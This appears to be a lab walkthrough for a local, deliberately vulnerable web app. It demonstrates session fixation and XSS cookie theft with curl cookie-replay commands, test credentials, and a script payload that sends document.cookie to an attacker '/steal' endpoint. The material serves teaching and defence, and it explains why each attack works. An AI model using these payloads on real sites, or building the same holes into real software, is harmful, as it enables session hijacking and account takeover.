# Attack Walkthrough

**Note:** If using real hostnames, replace `localhost:5001` with `vuln-app:5001` and `localhost:8080` with `legit-app:8080` in all URLs below.

## Attack 1: Session Fixation

**Goal:** Hijack a session by forcing a known session ID before victim logs in.

### Steps

1. Open attacker page: [http://localhost:8080](http://localhost:8080)
2. Click "Click here to log in and claim your money!"
3. This opens: `http://localhost:5001/login?session_id=69420-6736`
4. Victim logs in with alice/password123
5. Attacker uses same session ID with curl:
```bash
curl -b "session_id=69420-6736" http://localhost:5001/dashboard
```

**Or use browser:**
- Open private/incognito window
- Go to [http://localhost:5001](http://localhost:5001)
- Press F12 → Application/Storage → Cookies
- Add cookie: `session_id` = `69420-6736`
- Navigate to `/dashboard`

**Result:** Attacker accesses alice's dashboard without credentials.

### Why It Works

- App accepts session_id from URL parameter
- App doesn't regenerate session on login
- Session ID `69420-6736` is now linked to alice

## Attack 2: XSS Cookie Theft

**Goal:** Steal session cookie via XSS and replay it.

**Clean state (recommended):**
```bash
docker compose down -v
docker compose up -d
```
Then clear the cookies for http://localhost:5001

> This clears sessions from Attack 1.

### Steps

1. Victim is logged in: [http://localhost:5001/login](http://localhost:5001/login) (alice/password123)
2. Victim visits attacker page: [http://localhost:8080](http://localhost:8080)
3. Victim clicks "Click here to see your prizes!"
4. XSS payload executes, sends cookie to attacker server
5. Check attacker logs:

```bash
docker logs legit-app
```

You'll see: `"GET /steal?c=session_id=<value>HTTP/1.1" 200 -`

6. Attacker replays cookie:

```bash
curl -b "session_id=<value>" http://localhost:5001/dashboard
```

**Or use browser:**
1. Open private/incognito window
2. Go to [http://localhost:5001](http://localhost:5001)
3. Press F12 → Application/Storage → Cookies
4. Add cookie: `session_id` = `<value>`
5. Navigate to `/dashboard`

**Result:** Attacker accesses victim's session.

### Why It Works

- XSS in `display_name` parameter (using `|safe` filter)
- No HttpOnly flag, so JavaScript can read `document.cookie`
- Cookie sent to attacker's server via image request

### Payload Breakdown

```html
<script>
  new Image().src='http://localhost:8080/steal?c='+document.cookie
</script>
```

- Creates invisible image
- Sends GET request to attacker server with cookie
